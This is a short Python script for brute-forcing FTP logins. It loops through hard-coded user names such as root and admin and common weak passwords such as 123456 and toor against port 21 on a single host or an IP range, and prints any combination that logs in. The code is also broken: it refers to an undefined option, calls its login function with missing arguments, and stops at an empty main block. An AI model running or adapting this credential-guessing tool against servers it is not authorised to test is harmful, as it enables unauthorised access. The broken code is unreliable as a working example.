# coding=utf-8
"""
DATE:   2021/12/1
AUTHOR: TesterCC
"""

import ftplib
import json
from optparse import OptionParser

user_dict = ["anonymous","root", "admin"]
password_dict = ["anonymous","root", "admin","toor","123456","1234567","abc123","QWE!@#"]
FTPServer="127.0.0.1"

def  Login(FTPServer, userName, passwords):
    try:
        f = ftplib.FTP(FTPServer)
        f.connect(FTPServer, 21, timeout = 10)
        f.login(userName, passwords)
        f.quit()
        print ("The userName is %s and password is %s" %(userName,passwords))
    except ftplib.all_errors:
        pass

def main():
    usage = "Usage: %prog --host <host ip> --user <user name> --pw <password>"
    parse = OptionParser(usage=usage)
    parse.add_option("-h", '--host', type="string", dest="host", help="ftp server host, e.g. 10.0.0.1, 10.0.0.1-102")
    parse.add_option("-u", '--user', type="string", dest="username", help="ftp login user name")
    parse.add_option("-p", '--pw', type="string", dest="password", help="ftp login password")
    options, args = parse.parse_args()

    # todo
    if '-' in options.targetIP:
        for i in range(int(options.targetIP.split('-')[0].split('.')[3]), int(options.targetIP.split('-')[1]) + 1):
            Login(options.targetIP.split('.')[0] + '.' + options.targetIP.split('.')[1] + '.' +
                 options.targetIP.split('.')[2] + '.' + str(i))
    else:
        Login(options.targetIP)

    if '-' in options.targetIP:
        pass


    for user in user_dict:
         for passwd in password_dict:
                Login(FTPServer, user, passwd)


if __name__ == '__main__':
